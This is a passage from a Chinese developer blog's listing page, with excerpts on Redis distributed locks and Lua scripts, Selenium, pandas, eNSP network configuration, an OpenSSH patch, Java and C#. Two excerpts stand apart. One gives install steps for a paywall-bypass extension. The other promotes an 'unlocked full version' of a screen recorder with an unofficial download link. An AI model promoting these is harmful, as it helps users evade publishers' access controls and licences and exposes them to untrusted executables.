重入问题：重入问题是指 获得锁的线程可以再次进入到相同的锁的代码块中，可重入锁的意义在于防止死锁，比如HashTable这样的代码中，他的方法都是使用synchronized修饰的，假如他在一个方法内，调用另一个方法，那么此时如果是不可重入的，不就死锁了吗？所以可重入锁他的主要意义是防止死锁，我们的synchronized和Lock锁都是可重入的。不可重试：是指目前的分布式只能尝试一次，我们认为合理的情况是：当线程在获得锁失败后，他应该能再次尝试获得锁。超时释放：我们在加锁时增加了过期时间，这样的我们可以防止死锁，但是如果卡顿的时间超长，虽然我们采用了lua表达式防止删锁的时候，误删别人的锁，但是毕竟没有锁住，有安全隐患主从一致性：如果Redis提供了主从集群，当我们向集群写数据时，主机需要异步的将数据同步给从机，而万一在同步过去之前，主机宕机了，就会出现死锁问题。 一、分析可重入 1.原理 在Lock锁中，他是借助于底层的一个voaltile的一个state变量来记录重入的状态的，比如当前没有人持有这把锁，那么state=0，假如有人持有这把锁，那么state=1，如果持有这把锁的人再次持有这把锁，那么state就会+1 ，如果是对于synchronized而言，他在c语言代码中会有一个count，原理和state类似，也是重入一次就加一，释放一次就-1 ，直到减少成0 时，表示当前这把锁没有被人持有。
在redission中，也支持可重入锁
在分布式锁中，他采用hash结构用来存储锁，其中大key表示表示这把锁是否存在，用小key表示当前这把锁被哪个线程持有，所以接下来我们一起分析一下当前的这个lua表达式
2、获取锁源码 我们点进去Redisson获取锁的源码 可以发现如下代码 也就是下面的代码
-- 判断是否存在 if ((redis.call('exists', KEYS[1]) == 0) -- 存在，判断是否是自己的锁 or (redis.call('hexists', KEYS[1], ARGV[2]) == 1)) then -- 不存在，获取锁或者是自己的锁，次数加1 redis.call('hincrby', KEYS[1], ARGV[2], 1); -- 设置过期时间 redis.call('pexpire', KEYS[1], ARGV[1]); -- 返回nil return nil; end ; -- 返回剩余过期时间 return redis.call('pttl', KEYS[1]); 1.这个地方一共有3个参数3 KEYS[1] ： 锁名称
ARGV[1]： 锁失效时间
ARGV[2]： id + ":" + threadId; 锁的小key
exists: 判断数据是否存在 name：是lock是否存在,如果==0，就表示当前这把锁不存在
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e78b85c60d3d769a7337c9ab067bd046/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77717ac3e94755e43385843517f1de01/" rel="bookmark">
			selenium 爬虫 ‘list‘ object has no attribute ‘text‘ 错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个错误是因为在使用selenium时，尝试访问一个列表对象的'text'属性，但列表对象并没有这个属性。要解决这个问题，需要先定位到具体的元素，然后再获取其文本内容。
解决方法如下：
使用find_elements_by_*方法找到所有匹配的元素。遍历这些元素，然后使用.text属性获取每个元素的文本内容。 示例代码：
from selenium import webdriver
driver = webdriver.Chrome()
driver.get("https://www.example.com")
# 假设我们要找到所有的&lt;a&gt;标签
elements = driver.find_elements_by_tag_name("a")
# 遍历元素并获取文本内容
for element in elements:
print(element.text)
driver.quit()
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ee93bc14535eadafad74d77494df4fa/" rel="bookmark">
			数据处理之数据类型转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点赞、关注再看，养成良好习惯Life is short, U need Python 1. 概述 本文主要以小费数据集（tips.csv）为例，介绍数据预处理中常用到的不同数据类型转换方法。
分类型数据转换成数值型；连续型数据转换成离散型。 首先，对小费数据集做一简单介绍：
tips包含244个样本，对应数据集的每行数据。每行数据包含每个样本的七个特征（总消费金额、小费金额、顾客性别、顾客是否抽烟、聚餐的星期、聚餐的时间段、聚餐人数），所以tips数据集是一个244行7列的二维表。其中，总消费金额(total_bill)和小费金额(tip)均为连续型数据集；顾客性别(sex)、是否抽烟(smoker)、聚餐的星期(day)、聚餐的时间段(time)均为分类型数据；聚餐人数(size)为离散型数据。
2. 读取数据 import pandas as pd tips = pd.read_csv('tips.csv') tips.head() 读取结果如上图所示（tips数据集是seaborn自带数据集，也可以在线下载读取）。
3. 分类型转数值型 3.1 map()函数 df1 = tips.copy() dict1 = {'Male':0,'Female':1} # 设置字典参数 df1.sex = df1.sex.map(dict1) dict2 = {'No':0,'Yes':1} df1.smoker = df1.smoker.map(dict2) dict3 = {'Sun':6, 'Sat':5, 'Thur':3, 'Fri':4} df1.day = df1.day.map(dict3) dict4 = {'Dinner':0, 'Lunch':1} df1.time = df1.time.map(dict4) df1.head() 3.2 repalce()函数 df2 = tips.copy() df2.sex = df2.sex.replace(df2.sex.unique(),[0,1]) df2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6ee93bc14535eadafad74d77494df4fa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5181c3ae9057253f8b7584e203682850/" rel="bookmark">
			Python爬取新冠肺炎实时数据及其可视化分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点赞、关注再看，养成良好习惯Life is short, U need Python 案例：Python爬取新冠肺炎实时数据及其可视化分析 作者：PyQuant
本案例适合作为大数据技术基础课程中数据爬取、清洗以及可视化部分的配套教学案例。通过本案例，能够达到以下教学效果：
培养学生爬取网站数据以及数据清洗、加工处理的能力。
案例中通过Python第三方库request获取网站实时数据，并利用pandas清洗数据为可视化数据做准备。 培养学生对真实数据进行可视化分析的能力。
案例中数据来源于网站爬取得到的新冠肺炎实时数据，对新冠肺炎感染者或疑似感染者等数据进行可视化分析。 帮助学生进一步掌握常用图表的绘制方法。
案例中涉及到折线图和柱状图等。 提高学生动手实践能力。
案例中使用Python中的常用可视化工具Matplotlib，提高学生绘制常用图表的实践能力。 1. 利用Python爬取实时数据 网站：https://news.qq.com/zt2020/page/feiyan.htm
原理：通过Requests获取Json请求，从而得到全国各省的疫情数据。
1.1 分析网站 通过浏览器 “审查元素” 查看源代码（右键单击网页地图选择‘审查元素’选项）及 “网络” 反馈的消息，如下图所示：
对应的HTTP信息如下所示：
1.2 发送请求并获取Json数据 通过分析url地址、请求方法、参数及响应格式，可以获取Json数据，注意url需要增加一个时间戳。
import time import json import requests url = 'https://view.inews.qq.com/g2/getOnsInfo?name=disease_h5&amp;callback=&amp;_=%d'%int(time.time()*1000) # 抓取腾讯疫情实时json数据 data = json.loads(requests.get(url=url).json()['data']) # 数据太多，打印一个键值对 print(data['lastUpdateTime']) 2020-03-11 16:46:29 2. 数据处理 2.1 认识数据 type(data),len(data) (dict, 12) print(data.keys()) dict_keys(['lastUpdateTime', 'chinaTotal', 'chinaAdd', 'isShowAdd', 'showAddSwitch', 'areaTree', 'chinaDayList', 'chinaDayAddList', 'dailyNewAddHistory', 'dailyHistory', 'wuhanDayList', 'articleList']) # data['areaTree'] # data['areaTree'][0] # 统计省份信息 num = data['areaTree'][0]['children'] # print(num) print(num[0]) # 数据太多，打印部分 {'name': '湖北', 'today': {'confirm': 13, 'confirmCuts': 0, 'isUpdated': True, 'tip': ''}, 'total': {'confirm': 67773, 'suspect': 0, 'dead': 3046, 'deadRate': '4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5181c3ae9057253f8b7584e203682850/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d17686c8d4d2bf9c59a8d76383503c83/" rel="bookmark">
			ensp DHCP基本配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一.启动DHCP
1.dhcp enable
二.配置路由器接口ip（即网关ip）及地址池类型（全局、接口）
1.interface GigabitEthernet0/0/1
ip address 192.168.2.254 255.255.255.0 dhcp select global（全局地址池）
2.interface GigabitEthernet0/0/0
ip address 192.168.1.254 255.255.255.0
dhcp select interface（接口地址池）
dhcp server static-bind ip-address 192.168.1.1 mac-address 5489-9819-1e5b（PC6）
三.配置全局地址池
1.ip pool 1
2.配置全局地址池网关
gateway-list 192.168.2.254 3.配置全局地址池网络段 network 192.168.2.0 mask 255.255.255.0 4.删除地址池中的IP excluded-ip-address 192.168.2.3 192.168.2.253 5.配置DNS dns-list 8.8.8.8 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/207d49b66a9c39e04a4ad107041e2775/" rel="bookmark">
			麒麟V10 openssh最新漏洞补丁openssh-9.3p2 rpm包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 openssh漏洞：
1、OpenSSH&lt;9.1 多个安全漏洞
2、OpenSSH&lt;9.3p2漏洞 CVE-2023-38408
解决：升级至openssh-9.3p2版本
操作系统：银河麒麟v10
系统架构：arm架构
安装升级openssh版本9.3 p2 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9bbca5e4d30fcaf4a55f2598dbe27c4/" rel="bookmark">
			滚雪球学Java(09-9)：Java中的三目运算符，你真的掌握了吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		咦咦咦，各位小可爱，我是你们的好伙伴——bug菌，今天又来给大家普及Java SE相关知识点了，别躲起来啊，听我讲干货还不快点赞，赞多了我就有动力讲得更嗨啦！所以呀，养成先点赞后阅读的好习惯，别被干货淹没了哦~
🏆本文收录于「滚雪球学Java」专栏，专业攻坚指数级提升，助你一臂之力，带你早日登顶🚀，欢迎大家关注&amp;&amp;收藏！持续更新中，up！up！up！！
环境说明：Windows 10 + IntelliJ IDEA 2021.3.2 + Jdk 1.8 文章目录 前言摘要Java-三目运算符简介源代码解析应用场景案例1. 判断两个数的大小关系2. 判断一个数是否为偶数3. 判断一个数是否等于04. 判断一个字符串是否为空 优缺点分析优点缺点 类代码方法介绍1. 三目运算符基本使用方法2. 判断一个数是否为偶数3. 判断一个数是否等于0 测试用例1. 测试两个数的大小关系2. 测试一个数是否为偶数3. 测试一个数是否等于0测试代码演示测试结果测试代码分析 全文小结 总结附录源码 ☀️建议/推荐你📣关于我 前言 在Java开发中，三目运算符是比较常用的一种运算符，也是Java基础语法的一部分。在本篇文章中，我们将介绍三目运算符的基本使用方法和应用场景，使读者能够更好地理解和运用三目运算符。
摘要 本篇文章主要介绍Java中的三目运算符。首先从概念入手，阐述了三目运算符的意义和特点。接着，重点介绍了三目运算符的使用方法、应用场景以及优缺点分析。最后，我们通过实例代码和测试用例来验证三目运算符的应用效果和正确性。本文将帮助Java零基础的读者掌握三目运算符的基本使用方法，并能熟练应用到实际开发中。
Java-三目运算符 简介 三目运算符是Java中一种特殊的条件运算符，也被称为条件运算符或者三元运算符。它是一种由三个操作数组成的运算符，格式如下：
表达式1 ? 表达式2 : 表达式3; 其中，表达式1必须是一个布尔类型的表达式，如果表达式1的值为true，则执行表达式2，否则执行表达式3。表达式2和表达式3可以是任何类型的表达式，但类型必须一致。
三目运算符可以简化代码，并且提高代码的可读性。例如，可以使用三目运算符来代替if…else语句，使得代码更加简洁明了。
源代码解析 下面我们通过一个简单的例子来解析三目运算符的源代码：
public class Demo { public static void main(String[] args) { int a = 1; int b = 2; int max = (a &gt; b) ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9bbca5e4d30fcaf4a55f2598dbe27c4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/743bffec3e177b46c9421de831d711f5/" rel="bookmark">
			2023年APMCM亚太赛（C题）新能源电动车|亚太地区大学生数学建模竞赛 建模解析，鹿鹿学长带队指引全代码文章与思路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我是鹿鹿学长，就读于上海交通大学，截至目前已经帮200+人完成了建模与思路的构建的处理了～
让我们来看看亚太赛的C题！
完整内容可以在文章末尾领取！
另外还有数据包提供呀：
问题重述 问题1：分析影响中国新能源电动车发展的主要因素，建立数学模型，并描述这些因素对中国新能源电动车发展的影响。
问题2：收集中国新能源电动车行业发展数据，建立数学模型描述并预测未来10年中国新能源电动车的发展趋势。
问题3：收集数据，建立数学模型分析新能源电动车对全球传统能源汽车行业的影响。
问题4：一些国家制定了一系列旨在抵制中国新能源电动车发展的政策。建立数学模型分析这些政策对中国新能源电动车发展的影响。
问题5：分析新能源电动车（包括电动公交车）在城市中电气化对生态环境的影响。假设城市人口为100万，请提供模型的计算结果。
问题6：基于问题5的结论，撰写一封公开信向市民宣传新能源电动车的好处以及电动车行业对全球各国的贡献。
问题一 以下是解决问题一的具体思路：
因素选择： 根据问题描述和背景知识，选择可能影响新能源电动车发展的因素。这些因素可以包括政府政策支持（例如补贴政策）、技术创新（例如电池技术进步）、市场需求（例如油价、消费者偏好）、经济因素（例如国家经济状况）等。
数据收集： 收集与选定因素相关的数据。这可以包括历年来的政策文件、技术研究报告、市场调查数据等。确保数据的质量和可靠性。
数据预处理： 对收集到的数据进行预处理，包括处理缺失值、异常值，进行数据标准化等。这有助于提高模型的训练效果。
模型建立： 基于多元线性回归的数学模型建立。模型的一般形式为：
Y = β 0 + β 1 X 1 + β 2 X 2 + … + β n X n + ϵ Y = \beta_0 + \beta_1X_1 + \beta_2X_2 + \ldots + \beta_nX_n + \epsilon Y=β0​+β1​X1​+β2​X2​+…+βn​Xn​+ϵ
其中， Y Y Y是新能源电动车发展的程度， X 1 , X 2 , … , X n X_1, X_2, \ldots, X_n X1​,X2​,…,Xn​ 是选定的因素， β 0 , β 1 , … , β n \beta_0, \beta_1, \ldots, \beta_n β0​,β1​,…,βn​ 是模型的系数， ϵ \epsilon ϵ是误差项。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/743bffec3e177b46c9421de831d711f5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5141e77c36af1ac71bbc3549e61d197f/" rel="bookmark">
			Error: getaddrinfo ENOTFOUND http:127.0.0.1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在我们使用postman测试的时候，可能会遇到下面报错
解决报错的方法很简单，将url路径http:127.0.0.1:80/exportTemplateData改为http://127.0.0.1:80/exportTemplateData即可，所以我们在自测的时候，一定要注意url的格式
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7d5b4f6641b10a00a95248ab2143fb1/" rel="bookmark">
			贷后催收专用分案算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最优分案算法: 在开发中,有这么一种业务场景,就是需要根据一定的比例,按照数量与金额都按照这个比例进行分配,要求数量与金额都能达到最优的情况。如果只按照数量或者金额分配是比较好计算的,但是两者都需要兼顾到,这是一种比较复杂的算法,我现在将我的算法demo贴出来,供同学们一起学习一下。
可以直接将代码拷贝到本地,main方法直接运行
package cn.com.smart.eq.test; import java.awt.*; public class CaseAssignTool { public CaseAssignTool() { } public static void main(String[] args) { CaseFrame frame = new CaseFrame(); frame.setTitle("手工分案-V2.8"); frame.setDefaultCloseOperation(3); frame.setLocationRelativeTo((Component)null); frame.setVisible(true); frame.setResizable(false); } } // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package cn.com.smart.eq.test; import com.zpp.dto.AssignDto; import com.zpp.dto.CaseDto; import java.awt.Font; import java.awt.LayoutManager; import java.awt.event.ActionEvent; import java.awt.event.ActionListener; import java.io.File; import java.io.FileInputStream; import java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d7d5b4f6641b10a00a95248ab2143fb1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d641cc153883fd5fc2a678e4797e2507/" rel="bookmark">
			简单的用Python采集股票数据，保存表格后分析历史数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 字节跳动如果上市，那么钟老板将成为我国第一个世界首富
趁着现在还没上市，咱们提前学习一下用Python分析股票历史数据，抱住粗大腿坐等起飞~
好了话不多说，我们直接开始正文
准备工作 环境使用
Python 3.10 解释器Pycharm 编辑器 模块使用
requests —&gt; 数据请求模块csv -&gt; 保存csv表格pandas -&gt; 可以实现保存Excel表格文件 requests和pandas是第三方模块，需要手动安装，直接pip install 加上模块名字即可。
案例实现流程 数据来源分析
明确需求: 明确采集的网站以及数据内容
- 网址: 本次目标
- 数据: 股票数据
抓包分析: 分析 股票数据, 可以请求那个网址能够得到
- 打开开发者工具: F12 / 右键点击检查选择 network (网络)
- 点击第二页数据
请求网址: 请求方式: 请求头: 代码实现步骤
发送请求 -&gt; 模拟浏览器对于url发送请求获取数据 -&gt; 获取服务器返回响应数据 &lt;整个数据&gt;解析数据 -&gt; 提取我们需要数据保存数据 -&gt; 保存表格文件 &lt; csv / Excel &gt; 中 代码解析 保存表格文件
csv -&gt; csv模块Excel -&gt; pandas模块 # 创建文件对象 f = open('股票.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d641cc153883fd5fc2a678e4797e2507/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90de9d7845b62df59664a5529456eac1/" rel="bookmark">
			Bypass Paywalls
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Bypass Paywalls|#工具 #外刊
Description： Bypass Paywalls一款浏览器插件，可以帮助你绕过160+网站的付费墙，例如The Economist、Bloomberg、The Atlantic、The New York Times、The New Yorker、Harvard Business Review等主流外刊网站，下图为解锁前后效果
Instructions： 进入网址：GitHub - iamadamdev/bypass-paywalls-chrome: Bypass Paywalls web browser extension for Chrome and Firefox. 根据浏览器，点击插件下载链接
点击“管理扩展程序”
打开“开发者模式”
将之前下载下来的文件解压，然后点击“加载已解压的扩展程序”
PS： 如遇到无法解锁的情况，按Ctrl+Shift+N，进入浏览器的无痕模式即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce35db2387826d71de138ee0a2093565/" rel="bookmark">
			【计算机毕业选题】2024年最全的计算机毕业设计选题推荐
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2024年最全的计算机毕业设计选题推荐
下面我列举一些选题，精仅供大家参考，希望对大家在毕设上有所帮助
医院住院管理系统
高校教务管理系统
敬老院管理系统
医学药品管理系统
快递物流管理系统
企业进销存管理系统
高校大学生社团管理系统
客户关系管理系统
健身俱乐部管理系统
瑜伽馆管理系统
停车场管理系统
小区物业管理系统
宿舍公共财产管理系统
高校物资采购管理系统
高校招生管理系统
驾校管理系统
校运动会管理系统
美容美发店管理系统
实验室设备管理系统
生鲜超市进销存管理系统
教师工作考核绩效管理系统
高校新生报到迎新管理系统
学生考勤管理系统
高校毕业论文管理系统
疫情网课管理系统
大学生体质测试管理系统
新生宿舍管理系统
高校会议室管理系统
电子健康档案管理系统
教师人事档案管理系统
高校实验报告管理系统
车辆维修管理系统
高校固定资产管理系统
小区物业管理系统
垃圾分类管理系统
C语言课程设计考核管理系统
班级事务管理系统
高校毕业生就业信息管理系统
共享充电宝管理系统
高校共享单车管理系统
高校奖学金管理系统
高校勤工助学管理系统
网上摄影工作室系统
校园跑腿业务系统
特色手工艺品网站
校园快递代领网站
同城物流配送网站系统
少儿编程学习网站
洗衣店业务管理系统
驾校预约报名系统
口腔牙科诊所预约系统
高校会议室预约系统
二手车交易网站
校园爱心公益平台
小饰品商城系统
红色文化系统
景区自助旅游平台
大学生心理健康测试系统
学生互动交流平台
社区医疗服务系统
大学生上门家教系统
基于疫情下的校园出入系统
高校智能排课系统
大学生在线学习平台
家政服务平台
体育球馆预定系统
医院在线挂号系统
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ce35db2387826d71de138ee0a2093565/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/175a492ca00c64b0d1f710b53ca2e3ee/" rel="bookmark">
			【计算机毕业选题】史上最全的计算机毕业设计选题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		史上最全的计算机毕业设计选题
下面我列举一些选题，精仅供大家参考，希望对大家在毕设上有所帮助
医院住院管理系统
高校教务管理系统
敬老院管理系统
医学药品管理系统
快递物流管理系统
企业进销存管理系统
高校大学生社团管理系统
客户关系管理系统
健身俱乐部管理系统
瑜伽馆管理系统
停车场管理系统
小区物业管理系统
宿舍公共财产管理系统
高校物资采购管理系统
高校招生管理系统
驾校管理系统
校运动会管理系统
美容美发店管理系统
实验室设备管理系统
生鲜超市进销存管理系统
教师工作考核绩效管理系统
高校新生报到迎新管理系统
学生考勤管理系统
高校毕业论文管理系统
疫情网课管理系统
大学生体质测试管理系统
新生宿舍管理系统
高校会议室管理系统
电子健康档案管理系统
教师人事档案管理系统
高校实验报告管理系统
车辆维修管理系统
高校固定资产管理系统
小区物业管理系统
垃圾分类管理系统
C语言课程设计考核管理系统
班级事务管理系统
高校毕业生就业信息管理系统
共享充电宝管理系统
高校共享单车管理系统
高校奖学金管理系统
高校勤工助学管理系统
网上摄影工作室系统
校园跑腿业务系统
特色手工艺品网站
校园快递代领网站
同城物流配送网站系统
少儿编程学习网站
洗衣店业务管理系统
驾校预约报名系统
口腔牙科诊所预约系统
高校会议室预约系统
二手车交易网站
校园爱心公益平台
小饰品商城系统
红色文化系统
景区自助旅游平台
大学生心理健康测试系统
学生互动交流平台
社区医疗服务系统
大学生上门家教系统
基于疫情下的校园出入系统
高校智能排课系统
大学生在线学习平台
家政服务平台
体育球馆预定系统
医院在线挂号系统
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/175a492ca00c64b0d1f710b53ca2e3ee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8a6e0b90dd3d5eb1a481f47910f3c2f/" rel="bookmark">
			C#中的json字符串
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在C#编程中，JSON字符串是一个非常常见的数据格式。它被用来存储和传输结构化数据。C#提供了多种处理JSON字符串的方法，使得我们能够轻松地操作它们。
要创建JSON字符串，我们可以使用C#中的Newtonsoft.Json库。这个库提供了各种各样的功能，例如将Object转换为JSON字符串，或者将JSON字符串转换为Object等等。
// 创建一个JSON字符串 string json = @"{ 'Name': '张三', 'Age': 18, 'IsMale': true, 'Hobby': ['游泳','健身'] }"; // 将JSON字符串解析成对象 dynamic obj = Newtonsoft.Json.JsonConvert.DeserializeObject(json); // 获取属性值 Console.WriteLine(obj.Name); Console.WriteLine(obj.Age); Console.WriteLine(obj.IsMale); Console.WriteLine(obj.Hobby[0]); // 将对象转换成JSON字符串 string newJson = Newtonsoft.Json.JsonConvert.SerializeObject(obj); 通过这段代码，我们可以看到，将JSON字符串解析成对象非常容易，只需要使用JsonConvert.DeserializeObject()方法即可。然后我们可以通过对象获取属性值。我们也可以通过JsonConvert.SerializeObject()方法将对象转换成JSON字符串。
总之，通过C#处理JSON字符串非常方便，我们只需要使用Newtonsoft.Json库即可完成。无论是创建JSON字符串，还是将JSON字符串解析成对象，都可以通过这个库轻松解决。
json字符串的使用步骤： 启动vs2012，新建winform—C#工程。在解决方案管理器中，鼠标右击打开NuGet程序包管理器，如下图
在NuGet程序包管理器中在线搜索“json”，选择JSon.Net，并安装。如下：
如果在解决方案管理器中的引用项中出现NewtonSoft.Json后表示安装成功，如下：
然后，双击窗体，添加代码，如下：
JObject obj = JObject.Parse("{\"h\":\"Hello world!!!\"}");
MessageBox.Show((string)obj["h"] );
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd5a5a96e374dec4fc6ffd5ae9450e8f/" rel="bookmark">
			ensp的ospf实现vlan在三层交换机与路由器之间互通（干货）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SW1配置信息
vlan batch 2 10 # interface Vlanif2 ip address 10.1.11.1 255.255.255.0 # interface Vlanif10 ip address 192.168.1.254 255.255.255.0 # interface GigabitEthernet0/0/1 port link-type access port default vlan 10 # interface GigabitEthernet0/0/2 port link-type access port default vlan 10 # interface GigabitEthernet0/0/3 port link-type access port default vlan 2 # ospf 1 area 0 network 192.168.1.0 0.0.0.255 network 10.1.11.0 0.0.0.255 AR1配置信息
ospf 1 router-id 1.1.1.1 area 0 # interface GigabitEthernet0/0/0 ip address 10.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd5a5a96e374dec4fc6ffd5ae9450e8f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e783edffb41dd1ba60b94e8ec1ba1a36/" rel="bookmark">
			Action!录屏工具免费完整版，录屏软件，打开即可解锁最新完整可用版本，支持GPU加速HDR视频录制和播放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、软件简介 本次带来的录屏工具已升级为【完整版本】，所有功能全部可用。该录屏工具支持GPU硬件加速，可以智能识别主流硬件设备，支持通过GPU进行HDR视频录制和播放进行。视频录制帧率最高支持360FPS，直播视频帧率最高支持60FPS，还支持在不同设备（摄像头等）之间进行视频录制，同时具备音频录制和截图功能。
二、使用方法 解压后进入文件夹，文件夹内包含一个子文件夹和一个可执行程序，双击【Action_Portable.exe】即可进入录屏软件主界面。
主界面如下图所示，右上角红色框内为录制功能区，包含视频录制、直播、音频录制、截图等一系列常用功能。视频录制功能又分为多种不同的录制模式，包括：游戏录制、全屏录制、窗口录制、范围录制以及设备录制。
全屏录制 全屏录制只需点击视频录制功能的第二个模式即可，选中该模式后，按键盘的【F9】按键即可进行录制，再次按【F9】即可结束录制过程。
录制效果如下（GIF动图效果不佳，视频文件还是非常高清的）
窗口录制 窗口录制功能可以选择一个打开的应用程序或窗口，直接对选定的窗口进行内容录制。提前打开需要录制的应用程序，选择视频录制的【窗口】模式后，在【应用】选项卡中下拉可以看到当前已经打开的应用和窗口，选中要录制的应用或窗口即可。
在窗口录制模式下，即使你将所录制的窗口最小化，也不会录制到选定窗口以外的区域，录制过程非常的安全，可以避免录制到一些不希望被其他人看见的内容。
范围录制 范围录制就是仅录制屏幕上一块选定的区域，和窗口录制不同，范围录制会将所选屏幕区域所有的动作都录制下来。
在范围录制模式中，可以点击工具栏左侧第二个按钮，使录制框自动吸附到某一个界面，可以省去手动调整窗口大小的麻烦。
自动吸附到窗口的动态效果如下图所示，绿色的录制范围框会随鼠标的移动而自动吸附到不同的窗口。
三、下载链接 https://pan.baidu.com/s/1qZF-qn4UqU-ktCjoZs8sAw?pwd=katk 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73bd0b9de21ce9c5ef10a8bf012dd850/" rel="bookmark">
			移动光猫拨号(路由模式)下的IPV6获取方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 按图设置即可
1、设置拨号连接，获取前缀
2、将前缀填写到用户侧的IPV6设置里
3、测试ipv6 或者：
在哪里获取前缀，前缀在哪里出现的 设置完，等候5分钟，去 状态页找前缀信息。 /60代表长度是60，是写在长度那一行的。
不是写在前缀里的 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/431b417e12efbd45e912489a5718202a/" rel="bookmark">
			Lua脚本解决redis实现的分布式锁多条命令原子性问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		线程1现在持有锁之后，在执行业务逻辑过程中，他正准备删除锁，而且已经走到了条件判断的过程中，比如他已经拿到了当前这把锁确实是属于他自己的，正准备删除锁，但是此时他的锁到期了，那么此时线程2进来，但是线程1他会接着往后执行，当他卡顿结束后，他直接就会执行删除锁那行代码，相当于条件判断并没有起到作用，这就是删锁时的原子性问题，之所以有这个问题，是因为线程1的拿锁，比锁，删锁，实际上并不是原子性的，我们要防止刚才的情况发生
Redis提供了Lua脚本功能，在一个脚本中编写多条Redis命令，确保多条命令执行时的原子性。Lua是一种编程语言，它的基本语法大家可以参考网站：https://www.runoob.com/lua/lua-tutorial.html，这里重点介绍Redis提供的调用函数，我们可以使用lua去操作redis，又能保证他的原子性，这样就可以实现拿锁比锁删锁是一个原子性动作了，作为Java程序员这一块并不作一个简单要求，并不需要大家过于精通，只需要知道他有什么作用即可。
接下来就是我们之前释放锁的逻辑：
释放锁的业务流程是这样的
​ 1、获取锁中的线程标示
​ 2、判断是否与指定的标示（当前线程标示）一致
​ 3、如果一致则释放锁（删除）
​ 4、如果不一致则什么都不做
如果用Lua脚本来表示则是这样的：
最终我们操作redis的拿锁比锁删锁的lua脚本就会变成这样
-- 这里的 KEYS[1] 就是锁的key，这里的ARGV[1] 就是当前线程标示 -- 获取锁中的标示，判断是否与当前线程标示一致 if (redis.call('GET', KEYS[1]) == ARGV[1]) then -- 一致，则删除锁 return redis.call('DEL', KEYS[1]) end -- 不一致，则直接返回 return 0 下面就是在java中如何调用，我们的RedisTemplate中，可以利用execute方法去执行lua脚本。
Java代码
